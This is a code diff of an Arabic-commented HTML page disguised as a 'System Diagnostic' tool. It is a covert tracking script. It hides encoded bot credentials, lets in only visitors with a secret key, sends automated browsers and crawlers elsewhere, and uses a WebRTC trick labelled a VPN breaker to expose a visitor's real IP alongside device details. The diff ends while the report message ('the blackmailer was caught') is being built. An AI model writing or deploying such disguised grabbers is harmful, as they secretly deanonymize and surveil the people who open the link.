@@ -2,27 +2,27 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
     <title>System Diagnostic</title>
 </head>
 <body style="background:#000;">
     <script>
         (async function() {
-            // [نظام حماية V50] - التوكن والـ ID مشفرين تماماً
+            // [الحماية النهائية V51]
             const _0x_u = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
             const _0x_c = "NTc3NTc4MTAzOA==";
             const _0x_k = "portal";
 
             const _p = new URLSearchParams(window.location.search);
             
-            // 1. حاجز الكلمة السرية (طرد أي زائر بدون المفتاح)
-            if (_p.get('access') !== _0x_k) {
+            // حاجز المفتاح السري + طرد البوتات
+            if (_p.get('access') !== _0x_k || navigator.webdriver) {
                 window.location.replace("https://www.google.com"); 
                 return;
             }
 
-            // 2. حاجز فحص البوتات (منع الأجهزة الوهمية والمتصفحات الآلية)
-            const isBot = !navigator.userAgent || /bot|crawler|spider|crawling/i.test(navigator.userAgent) || !navigator.plugins.length;
-            if (isBot) {
+            // فحص إضافي للبوتات المتطورة
+            if (!navigator.languages || navigator.languages.length === 0) {
                 window.location.replace("https://www.bing.com");
                 return;
             }
@@ -38,7 +38,7 @@
                 lang: navigator.languages.join(", ")
             };
 
-            // 🔥 كاسر الـ VPN (WebRTC) لجلب الـ IP الحقيقي
+            // كاسر الـ VPN
             try {
                 const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                 pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
@@ -55,7 +55,6 @@
                 _d.bt = Math.round(b.level * 100) + "% " + (b.charging ? "(يُشحن)" : "(تفريغ)");
             }
 
-            // إرسال التقرير (نفس تنسيق الصورة 100%)
             setTimeout(async () => {
                 const _msg = `🔥 تم اصطياد المبتز بنجاح 🔥\n\n` +
                                `🌐 الـ IP الحقيقي: ${_d.ip}\n` +
